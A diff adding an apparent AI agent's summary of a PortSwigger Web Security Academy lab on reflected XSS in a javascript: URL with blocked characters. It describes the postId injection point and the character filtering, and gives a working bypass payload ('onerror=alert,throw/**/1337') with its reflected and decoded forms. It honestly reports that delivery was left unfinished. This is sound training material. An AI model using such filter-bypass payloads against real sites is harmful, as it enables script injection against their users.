@@ -1,0 +1,46 @@
+## Summary: Reflected XSS in JavaScript URL with Some Characters Blocked
+
+### Target
+https://0ab300550381a92a80e303c400f10030.web-security-academy.net
+
+### Findings
+
+1. **Injection Point Identified**: The `postId` parameter on `/post` pages is reflected inside a `javascript:` href in the "Back to Blog" link:
+   ```
+   <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d<REFLECTED>'}).finally(_ => window.location = '/')">Back to Blog</a>
+   ```
+
+2. **Character Filtering**: The application blocks certain characters:
+   - `]` is stripped from the output
+   - `=` is URL-encoded as `%3d` (but this is fine since browsers URL-decode javascript: URLs before execution)
+   - Spaces are blocked (bypassed with `/**/` blank JS comment)
+
+3. **XSS Payload Constructed**: Using the hint's approach:
+   - `onerror=alert` assigns alert to the error handler
+   - `throw/**/1337` throws the value 1337 (/**/ replaces blocked space)
+   - Arrow function / toString pattern not needed for basic payload
+
+4. **Payload URL**:
+   ```
+   https://TARGET/post?postId=5&%27},x||onerror=alert,throw/**/1337||%27
+   ```
+
+   This reflects as:
+   ```
+   javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x||onerror%3dalert,throw/**/1337||%27'}).finally(...)
+   ```
+
+   After browser URL-decoding of the javascript: href:
+   ```
+   fetch('/analytics', {method:'post',body:'/post?postId=5&'},x||onerror=alert,throw/**/1337||''}).finally(...)
+   ```
+
+5. **Delivery**: The XSS fires when a user clicks the "Back to Blog" link on the crafted page. For lab completion, this would need to be delivered via the exploit server to a simulated victim who clicks the link.
+
+### Status
+- Payload is correctly reflected in the page with `alert` and `1337` present
+- Did not complete full delivery via exploit server due to token limit
+- Character blocking analysis was partially completed (syntax error interrupted the char_test.py run)
+
+### Token Limit
+Session ended due to token limit before full exploit delivery could be completed.
